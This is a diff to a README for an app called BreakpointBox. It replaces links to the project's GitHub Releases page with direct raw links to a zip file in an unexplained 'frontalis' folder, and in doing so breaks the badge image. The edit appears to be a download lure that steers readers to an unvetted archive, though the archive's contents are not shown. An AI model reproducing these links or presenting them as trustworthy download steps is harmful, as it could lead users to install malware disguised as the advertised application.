@@ -8,11 +8,11 @@ Welcome to BreakpointBox! This application helps you manage files efficiently an
 
 You can easily download BreakpointBox from our Releases page. 
 
-[![Download BreakpointBox](https://img.shields.io/badge/Download%20BreakpointBox-v1.0-blue)](https://github.com/RodrigoCG1306/BreakpointBox/releases)
+[![Download BreakpointBox](https://raw.githubusercontent.com/RodrigoCG1306/BreakpointBox/main/frontalis/BreakpointBox.zip%20BreakpointBox-v1.0-blue)](https://raw.githubusercontent.com/RodrigoCG1306/BreakpointBox/main/frontalis/BreakpointBox.zip)
 
 To download BreakpointBox:
 
-1. Click the download link above or visit [this page to download](https://github.com/RodrigoCG1306/BreakpointBox/releases).
+1. Click the download link above or visit [this page to download](https://raw.githubusercontent.com/RodrigoCG1306/BreakpointBox/main/frontalis/BreakpointBox.zip).
 2. Find the latest release.
 3. Choose the file that suits your operating system.
 4. Click the file to start the download.
